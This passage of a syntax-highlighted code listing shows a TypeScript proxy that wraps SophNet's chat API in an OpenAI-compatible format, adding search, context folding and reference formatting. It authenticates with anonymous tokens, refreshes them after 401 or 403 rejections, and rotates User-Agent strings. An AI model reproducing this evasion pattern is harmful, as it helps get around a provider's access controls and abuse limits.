添加全上下文+搜索版本模型</span></span><br><span class="line">    transformedModels.<span class="title function_">push</span>(&#123;</span><br><span class="line">      <span class="attr">id</span>: <span class="string">`<span class="subst">$&#123;model.modelFamily&#125;</span>-Full-Context-Search`</span>,</span><br><span class="line">      <span class="attr">object</span>: <span class="string">&quot;model&quot;</span>,</span><br><span class="line">      <span class="attr">created</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>(),</span><br><span class="line">      <span class="attr">owned_by</span>: <span class="string">&quot;sophnet&quot;</span>,</span><br><span class="line">      <span class="attr">permission</span>: [&#123;</span><br><span class="line">        <span class="attr">id</span>: <span class="string">`modelperm-<span class="subst">$&#123;model.id&#125;</span>-Full-Context-Search`</span>,</span><br><span class="line">        <span class="attr">object</span>: <span class="string">&quot;model_permission&quot;</span>,</span><br><span class="line">        <span class="attr">created</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>(),</span><br><span class="line">        <span class="attr">allow_create_engine</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">allow_sampling</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">allow_logprobs</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">allow_search_indices</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">allow_view</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">allow_fine_tuning</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">organization</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">        <span class="attr">group</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="attr">is_blocking</span>: <span class="literal">false</span>,</span><br><span class="line">      &#125;],</span><br><span class="line">      <span class="attr">root</span>: model.<span class="property">modelFamily</span>,</span><br><span class="line">      <span class="attr">parent</span>: <span class="literal">null</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">object</span>: <span class="string">&quot;list&quot;</span>,</span><br><span class="line">    <span class="attr">data</span>: transformedModels,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理全上下文功能</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">processFullContext</span>(<span class="params"><span class="attr">messages</span>: <span class="title class_">Message</span>[]</span>): <span class="title class_">Message</span>[] &#123;</span><br><span class="line">  <span class="comment">// 复制消息数组，避免修改原数组</span></span><br><span class="line">  <span class="keyword">const</span> messagesCopy = [...messages];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 提取系统消息（如果存在）</span></span><br><span class="line">  <span class="keyword">const</span> systemMessages = messagesCopy.<span class="title function_">filter</span>(<span class="function"><span class="params">msg</span> =&gt;</span> msg.<span class="property">role</span> === <span class="string">&quot;system&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取非系统消息</span></span><br><span class="line">  <span class="keyword">const</span> nonSystemMessages = messagesCopy.<span class="title function_">filter</span>(<span class="function"><span class="params">msg</span> =&gt;</span> msg.<span class="property">role</span> !== <span class="string">&quot;system&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果消息总数少于或等于3对（6条消息），则不需要处理</span></span><br><span class="line">  <span class="keyword">if</span> (nonSystemMessages.<span class="property">length</span> &lt;= <span class="number">6</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> messages;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 提取最后3轮对话（最多6条消息）</span></span><br><span class="line">  <span class="keyword">const</span> recentMessages = nonSystemMessages.<span class="title function_">slice</span>(-<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 提取需要合并的历史消息</span></span><br><span class="line">  <span class="keyword">const</span> historyMessages = nonSystemMessages.<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建历史消息的摘要</span></span><br><span class="line">  <span class="keyword">const</span> historySummary = &#123;</span><br><span class="line">    <span class="attr">role</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">    <span class="attr">content</span>: <span class="string">`这里是此前的对话上下文: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(historyMessages)&#125;</span>`</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 组合新的消息数组：系统消息 + 历史摘要 + 最近消息</span></span><br><span class="line">  <span class="keyword">return</span> [...systemMessages, historySummary, ...recentMessages];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将数字转换为上标形式</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">convertToSuperscript</span>(<span class="params"><span class="attr">num</span>: <span class="built_in">number</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> normalDigits = <span class="string">&#x27;0123456789&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> superscriptDigits = <span class="string">&#x27;⁰¹²³⁴⁵⁶⁷⁸⁹&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> num.<span class="title function_">toString</span>()</span><br><span class="line">    .<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    .<span class="title function_">map</span>(<span class="function"><span class="params">char</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> index = normalDigits.<span class="title function_">indexOf</span>(char);</span><br><span class="line">      <span class="keyword">return</span> index !== -<span class="number">1</span> ? superscriptDigits[index] : char;</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理聊天完成请求</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">handleChatCompletions</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">token</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">requestBody</span>: <span class="built_in">any</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">stream</span>: <span class="built_in">boolean</span>,</span></span><br><span class="line"><span class="params">  retryCount = <span class="number">0</span>,</span></span><br><span class="line"><span class="params"></span>): <span class="title class_">Promise</span>&lt;<span class="title class_">Response</span>&gt; &#123;</span><br><span class="line">  <span class="comment">// 检查模型名称的后缀</span></span><br><span class="line">  <span class="keyword">const</span> modelId = requestBody.<span class="property">model</span>;</span><br><span class="line">  <span class="keyword">const</span> webSearchEnable = modelId.<span class="title function_">includes</span>(<span class="string">&quot;-Search&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> fullContextEnable = modelId.<span class="title function_">includes</span>(<span class="string">&quot;-Full-Context&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 根据后缀确定实际模型ID</span></span><br><span class="line">  <span class="keyword">let</span> actualModelId = modelId;</span><br><span class="line">  <span class="keyword">if</span> (webSearchEnable) actualModelId = actualModelId.<span class="title function_">replace</span>(<span class="string">&quot;-Search&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (fullContextEnable) actualModelId = actualModelId.<span class="title function_">replace</span>(<span class="string">&quot;-Full-Context&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 处理消息</span></span><br><span class="line">  <span class="keyword">let</span> processedMessages = requestBody.<span class="property">messages</span>;</span><br><span class="line">  <span class="keyword">if</span> (fullContextEnable) &#123;</span><br><span class="line">    processedMessages = <span class="title function_">processFullContext</span>(requestBody.<span class="property">messages</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> sophNetBody = &#123;</span><br><span class="line">    <span class="attr">temperature</span>: requestBody.<span class="property">temperature</span> || <span class="number">0.7</span>,</span><br><span class="line">    <span class="attr">top_p</span>: requestBody.<span class="property">top_p</span> || <span class="number">0.9</span>,</span><br><span class="line">    <span class="attr">frequency_penalty</span>: requestBody.<span class="property">frequency_penalty</span> || <span class="number">0</span>,</span><br><span class="line">    <span class="attr">presence_penalty</span>: requestBody.<span class="property">presence_penalty</span> || <span class="number">0</span>,</span><br><span class="line">    <span class="attr">max_tokens</span>: requestBody.<span class="property">max_tokens</span> || <span class="number">2048</span>,</span><br><span class="line">    <span class="attr">webSearchEnable</span>: webSearchEnable,</span><br><span class="line">    <span class="attr">stop</span>: requestBody.<span class="property">stop</span> || [],</span><br><span class="line">    <span class="attr">stream</span>: stream.<span class="title function_">toString</span>(),</span><br><span class="line">    <span class="attr">model_id</span>: actualModelId,</span><br><span class="line">    <span class="attr">messages</span>: processedMessages,</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(</span><br><span class="line">      <span class="string">`<span class="subst">$&#123;SOPHNET_BASE_URL&#125;</span>/open-apis/projects/<span class="subst">$&#123;PROJECT_UUID&#125;</span>/chat/completions`</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">          <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">          <span class="string">&quot;Authorization&quot;</span>: <span class="string">`Bearer anon-<span class="subst">$&#123;token&#125;</span>`</span>,</span><br><span class="line">          <span class="string">&quot;Accept&quot;</span>: stream ? <span class="string">&quot;text/event-stream&quot;</span> : <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">          <span class="string">&quot;User-Agent&quot;</span>: <span class="title function_">getRandomUserAgent</span>(), <span class="comment">// 使用随机UA</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(sophNetBody),</span><br><span class="line">      &#125;,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果是401或403错误，尝试刷新token并重试</span></span><br><span class="line">    <span class="keyword">if</span> ((response.<span class="property">status</span> === <span class="number">401</span> || response.<span class="property">status</span> === <span class="number">403</span>) &amp;&amp; retryCount &lt; <span class="variable constant_">MAX_RETRIES</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Chat completion token expired, refreshing and retrying (<span class="subst">$&#123;retryCount + <span class="number">1</span>&#125;</span>/<span class="subst">$&#123;MAX_RETRIES&#125;</span>)...`</span>);</span><br><span class="line">      <span class="keyword">const</span> newToken = <span class="keyword">await</span> <span class="title function_">getAnonymousToken</span>();</span><br><span class="line">      <span class="comment">// 使用指数退避等待</span></span><br><span class="line">      <span class="keyword">const</span> delay = <span class="title function_">getExponentialBackoffDelay</span>(retryCount);</span><br><span class="line">      <span class="keyword">await</span> <span class="title function_">sleep</span>(delay);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">await</span> <span class="title function_">handleChatCompletions</span>(newToken, requestBody, stream, retryCount + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果是 429 或 500 错误，进行指数退避重试</span></span><br><span class="line">    <span class="keyword">if</span> ((response.<span class="property">status</span> === <span class="number">429</span> || response.<span class="property">status</span> &gt;= <span class="number">500</span>) &amp;&amp; retryCount &lt; <span class="variable constant_">MAX_RETRIES</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> delay = <span class="title function_">getExponentialBackoffDelay</span>(retryCount);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">`Chat completion failed with status <span class="subst">$&#123;response.status&#125;</span>. Retrying in <span class="subst">$&#123;delay&#125;</span>ms... (<span class="subst">$&#123;retryCount + <span class="number">1</span>&#125;</span>/<span class="subst">$&#123;MAX_RETRIES&#125;</span>)`</span>);</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">sleep</span>(delay);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">handleChatCompletions</span>(token, requestBody, stream, retryCount + <span class="number">1</span>); <span class="comment">// 使用当前token重试，如果失败会在上面的逻辑中刷新</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!response.<span class="property">ok</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`Chat completion failed: <span class="subst">$&#123;response.status&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 请求成功后获取新token并存储 (后台刷新)</span></span><br><span class="line">    <span class="title function_">getAnonymousToken</span>().<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Background token refresh failed:&quot;</span>, err));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error during chat completion fetch:&quot;</span>, error);</span><br><span class="line">    <span class="comment">// 如果是网络错误或其他非HTTP错误，也进行指数退避重试</span></span><br><span class="line">     <span class="keyword">if</span> (retryCount &lt; <span class="variable constant_">MAX_RETRIES</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> delay = <span class="title function_">getExponentialBackoffDelay</span>(retryCount);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">`Chat completion network error. Retrying in <span class="subst">$&#123;delay&#125;</span>ms... (<span class="subst">$&#123;retryCount + <span class="number">1</span>&#125;</span>/<span class="subst">$&#123;MAX_RETRIES&#125;</span>)`</span>);</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">sleep</span>(delay);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">handleChatCompletions</span>(token, requestBody, stream, retryCount + <span class="number">1</span>);</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">throw</span> error; <span class="comment">// 达到最大重试次数后抛出错误</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转换流式响应</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span>* <span class="title function_">transformStreamResponse</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">readableStream</span>: <span class="title class_">ReadableStream</span>&lt;<span class="title class_">Uint8Array</span>&gt;,</span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> reader = readableStream.<span class="title function_">getReader</span>();</span><br><span class="line">  <span class="keyword">const</span> decoder = <span class="keyword">new</span> <span class="title class_">TextDecoder</span>();</span><br><span class="line">  <span class="keyword">let</span> buffer = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 用于存储所有引用，以便在结束时生成参考资料部分</span></span><br><span class="line">  <span class="keyword">const</span> <span class="attr">references</span>: <span class="title class_">Reference</span>[] = [];</span><br><span class="line">  <span class="keyword">let</span> referencesEmitted = <span class="literal">false</span>; <span class="comment">// 标记是否已经发送过参考资料部分</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> &#123; done, value &#125; = <span class="keyword">await</span> reader.<span class="title function_">read</span>();</span><br><span class="line">      <span class="keyword">if</span> (done) &#123;</span><br><span class="line">        <span class="comment">// 如果有引用但尚未发送，在结束前发送参考资料部分</span></span><br><span class="line">        <span class="keyword">if</span> (references.<span class="property">length</span> &gt; <span class="number">0</span> &amp;&amp; !referencesEmitted) &#123;</span><br><span class="line">          <span class="keyword">const</span> referencesSection = <span class="title function_">generateReferencesSection</span>(references);</span><br><span class="line">          <span class="keyword">yield</span> <span class="string">`data: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(&#123;</span></span></span><br><span class="line"><span class="subst"><span class="string">            id: <span class="string">`chatcmpl-<span class="subst">$&#123;<span class="built_in">Date</span>.now()&#125;</span>`</span>, // 生成一个唯一的ID</span></span></span><br><span class="line"><span class="subst"><span class="string">            <span class="built_in">object</span>: <span class="string">&quot;chat.completion.chunk&quot;</span>,</span></span></span><br><span class="line"><span class="subst"><span class="string">            created: <span class="built_in">Math</span>.floor(<span class="built_in">Date</span>.now() / <span class="number">1000</span>),</span></span></span><br><span class="line"><span class="subst"><span class="string">            model: <span class="string">&quot;sophnet-model&quot;</span>, // 可以使用 SophNet 返回的模型名，或者固定一个</span></span></span><br><span class="line"><span class="subst"><span class="string">            choices: [</span></span></span><br><span class="line"><span class="subst"><span class="string">              &#123;</span></span></span><br><span class="line"><span class="subst"><span class="string">                index: <span class="number">0</span>,</span></span></span><br><span class="line"><span class="subst"><span class="string">                delta: &#123;</span></span></span><br><span class="line"><span class="subst"><span class="string">                  content: <span class="string">`\n\n<span class="subst">$&#123;referencesSection&#125;</span>`</span>,</span></span></span><br><span class="line"><span class="subst"><span class="string">                &#125;,</span></span></span><br><span class="line"><span class="subst"><span class="string">                finish_reason: <span class="literal">null</span>, // 在发送参考资料时，finish_reason通常为<span class="literal">null</span></span></span></span><br><span class="line"><span class="subst"><span class="string">              &#125;,</span></span></span><br><span class="line"><span class="subst"><span class="string">            ],</span></span></span><br><span class="line"><span class="subst"><span class="string">          &#125;)&#125;</span>\n\n`</span>;</span><br><span class="line">          referencesEmitted = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      buffer += decoder.<span class="title function_">decode</span>(value, &#123; <span class="attr">stream</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">      <span class="keyword">const</span> lines = buffer.<span class="title function_">split</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">      buffer = lines.<span class="title function_">pop</span>() || <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> line <span class="keyword">of</span> lines) &#123;</span><br><span class="line">        <span class="keyword">if</span> (line.<span class="title function_">trim</span>() === <span class="string">&quot;&quot;</span> || !line.<span class="title function_">startsWith</span>(<span class="string">&quot;data:&quot;</span>)) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> data = line.<span class="title function_">substring</span>(<span class="number">5</span>).<span class="title function_">trim</span>();</span><br><span class="line">        <span class="keyword">if</span> (data === <span class="string">&quot;[DONE]&quot;</span>) &#123;</span><br><span class="line">           <span class="comment">// 如果有引用但尚未发送，在结束前发送参考资料部分</span></span><br><span class="line">          <span class="keyword">if</span> (references.<span class="property">length</span> &gt; <span class="number">0</span> &amp;&amp; !referencesEmitted) &#123;</span><br><span class="line">            <span class="keyword">const</span> referencesSection = <span class="title function_">generateReferencesSection</span>(references);</span><br><span class="line">            <span class="keyword">yield</span> <span class="string">`data: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(&#123;</span></span></span><br><span class="line"><span class="subst"><span class="string">              id: <span class="string">`chatcmpl-<span class="subst">$&#123;<span class="built_in">Date</span>.now()&#125;</span>`</span>, // 生成一个唯一的ID</span></span></span><br><span class="line"><span class="subst"><span class="string">              <span class="built_in">object</span>: <span class="string">&quot;chat.completion.chunk&quot;</span>,</span></span></span><br><span class="line"><span class="subst"><span class="string">              created: <span class="built_in">Math</span>.floor(<span class="built_in">Date</span>.now() / <span class="number">1000</span>),</span></span></span><br><span class="line"><span class="subst"><span class="string">              model: <span class="string">&quot;sophnet-model&quot;</span>, // 可以使用 SophNet 返回的模型名，或者固定一个</span></span></span><br><span class="line"><span class="subst"><span class="string">              choices: [</span></span></span><br><span class="line"><span class="subst"><span class="string">                &#123;</span></span></span><br><span class="line"><span class="subst"><span class="string">                  index: <span class="number">0</span>,</span></span></span><br><span class="line"><span class="subst"><span class="string">                  delta: &#123;</span></span></span><br><span class="line"><span class="subst"><span class="string">                    content: <span class="string">`\n\n<span class="subst">$&#123;referencesSection&#125;</span>`</span>,</span></span></span><br><span class="line"><span class="subst"><span class="string">                  &#125;,</span></span></span><br><span class="line"><span class="subst"><span class="string">                  finish_reason: <span class="literal">null</span>, // 在发送参考资料时，finish_reason通常为<span class="literal">null</span></span></span></span><br><span class="line"><span class="subst"><span class="string">                &#125;,</span></span></span><br><span class="line"><span class="subst"><span class="string">              ],</span></span></span><br><span class="line"><span class="subst"><span class="string">            &#125;)&#125;</span>\n\n`</span>;</span><br><span class="line">            referencesEmitted = <span class="literal">true</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">yield</span> <span class="string">&quot;data: [DONE]\n\n&quot;</span>;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> sophNetEvent = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(data);</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 检查是否包含引用</span></span><br><span class="line">          <span class="keyword">if</span> (sophNetEvent.<span class="property">choices</span>?.[<span class="number">0</span>]?.<span class="property">refs</span> &amp;&amp; sophNetEvent.<span class="property">choices</span>[<span class="number">0</span>].<span class="property">refs</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 处理引用</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">const</span> ref <span class="keyword">of</span> sophNetEvent.<span class="property">choices</span>[<span class="number">0</span>].<span class="property">refs</span>) &#123;</span><br><span class="line">              <span class="comment">// 检查是否已经存在相同URL的引用</span></span><br><span class="line">              <span class="keyword">const</span> existingRefIndex = references.<span class="title function_">findIndex</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="property">url</span> === ref.<span class="property">url</span>);</span><br><span class="line">              <span class="keyword">if</span> (existingRefIndex === -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">// 添加新引用</span></span><br><span class="line">                references.<span class="title function_">push</span>(ref);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 生成引用标记，使用上标数字</span></span><br><span class="line">                <span class="keyword">const</span> refIndex = references.<span class="property">length</span>;</span><br><span class="line">                <span class="keyword">const</span> superscriptIndex = <span class="string">`⁽<span class="subst">$&#123;convertToSuperscript(refIndex)&#125;</span>⁾`</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 创建带引用标记的事件</span></span><br><span class="line">                <span class="keyword">yield</span> <span class="string">`data: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(&#123;</span></span></span><br><span class="line"><span class="subst"><span class="string">                  id: sophNetEvent.id || <span class="string">`chatcmpl-<span class="subst">$&#123;<span class="built_in">Date</span>.now()&#125;</span>`</span>, // 使用SophNet ID或生成新ID</span></span></span><br><span class="line"><span class="subst"><span class="string">                  <span class="built_in">object</span>: <span class="string">&quot;chat.completion.chunk&quot;</span>,</span></span></span><br><span class="line"><span class="subst"><span class="string">                  created: <span class="built_in">Math</span>.floor(<span class="built_in">Date</span>.now() / <span class="number">1000</span>),</span></span></span><br><span class="line"><span class="subst"><span class="string">                  model: sophNetEvent.model || <span class="string">&quot;sophnet-model&quot;</span>, // 使用SophNet模型名或固定</span></span></span><br><span class="line"><span class="subst"><span class="string">                  choices: [</span></span></span><br><span class="line"><span class="subst"><span class="string">                    &#123;</span></span></span><br><span class="line"><span class="subst"><span class="string">                      index: <span class="number">0</span>,</span></span></span><br><span class="line"><span class="subst"><span class="string">                      delta: &#123;</span></span></span><br><span class="line"><span class="subst"><span class="string">                        // SophNet的引用信息通常不在content中，我们需要手动添加</span></span></span><br><span class="line"><span class="subst"><span class="string">                        content: <span class="string">`[<span class="subst">$&#123;superscriptIndex&#125;</span>](<span class="subst">$&#123;ref.url&#125;</span>)`</span>,</span></span></span><br><span class="line"><span class="subst"><span class="string">                      &#125;,</span></span></span><br><span class="line"><span class="subst"><span class="string">                      finish_reason: <span class="literal">null</span>, // 引用事件通常没有finish_reason</span></span></span><br><span class="line"><span class="subst"><span class="string">                    &#125;,</span></span></span><br><span class="line"><span class="subst"><span class="string">                  ],</span></span></span><br><span class="line"><span class="subst"><span class="string">                &#125;)&#125;</span>\n\n`</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 转换为OpenAI格式的事件</span></span><br><span class="line">            <span class="keyword">const</span> openAIEvent = &#123;</span><br><span class="line">              <span class="attr">id</span>: sophNetEvent.<span class="property">id</span> || <span class="string">`chatcmpl-<span class="subst">$&#123;<span class="built_in">Date</span>.now()&#125;</span>`</span>, <span class="comment">// 使用SophNet ID或生成新ID</span></span><br><span class="line">              <span class="attr">object</span>: <span class="string">&quot;chat.completion.chunk&quot;</span>,</span><br><span class="line">              <span class="attr">created</span>: <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Date</span>.<span class="title function_">now</span>() / <span class="number">1000</span>),</span><br><span class="line">              <span class="attr">model</span>: sophNetEvent.<span class="property">model</span> || <span class="string">&quot;sophnet-model&quot;</span>, <span class="comment">// 使用SophNet模型名或固定</span></span><br><span class="line">              <span class="attr">choices</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="attr">index</span>: <span class="number">0</span>,</span><br><span class="line">                  <span class="attr">delta</span>: &#123;</span><br><span class="line">                    <span class="comment">// OpenAI通常将内容放在delta.content</span></span><br><span class="line">                    <span class="attr">reasoning_content</span>: sophNetEvent.<span class="property">choices</span>?.[<span class="number">0</span>]?.<span class="property">delta</span>?.<span class="property">reasoning_content</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">                    <span class="attr">content</span>: sophNetEvent.<span class="property">choices</span>?.[<span class="number">0</span>]?.<span class="property">delta</span>?.<span class="property">content</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">                  &#125;,</span><br><span class="line">                  <span class="attr">finish_reason</span>: sophNetEvent.<span class="property">choices</span>?.[<span class="number">0</span>]?.<span class="property">finish_reason</span> || <span class="literal">null</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">              ],</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">yield</span> <span class="string">`data: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(openAIEvent)&#125;</span>\n\n`</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error parsing event:&quot;</span>, e, <span class="string">&quot;Line:&quot;</span>, line);</span><br><span class="line">          <span class="comment">// 可以选择在这里发送一个错误事件给客户端</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    reader.<span class="title function_">releaseLock</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成参考资料部分</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">generateReferencesSection</span>(<span class="params"><span class="attr">references</span>: <span class="title class_">Reference</span>[]</span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (references.<span class="property">length</span> === <span class="number">0</span>) <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> section = <span class="string">&quot;## 参考资料\n\n&quot;</span>;</span><br><span class="line">  references.<span class="title function_">forEach</span>(<span class="function">(<span class="params">ref, index</span>) =&gt;</span> &#123;</span><br><span class="line">    section += <span class="string">`<span class="subst">$&#123;index + <span class="number">1</span>&#125;</span>. [<span class="subst">$&#123;ref.title&#125;</span>](<span class="subst">$&#123;ref.url&#125;</span>)\n`</span>;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> section;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转换非流式响应</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">transformNonStreamResponse</span>(<span class="params"><span class="attr">response</span>: <span class="title class_">Response</span></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> sophNetResponse = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 处理引用</span></span><br><span class="line">  <span class="keyword">let</span> content = sophNetResponse.<span class="property">choices</span>?.[<span class="number">0</span>]?.<span class="property">message</span>?.<span class="property">content</span> || <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">references</span>: <span class="title class_">Reference</span>[] = [];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 收集所有引用</span></span><br><span class="line">  <span class="keyword">if</span> (sophNetResponse.<span class="property">choices</span>?.[<span class="number">0</span>]?.<span class="property">message</span>?.<span class="property">refs</span> &amp;&amp; sophNetResponse.<span class="property">choices</span>[<span class="number">0</span>].<span class="property">message</span>.<span class="property">refs</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> ref <span class="keyword">of</span> 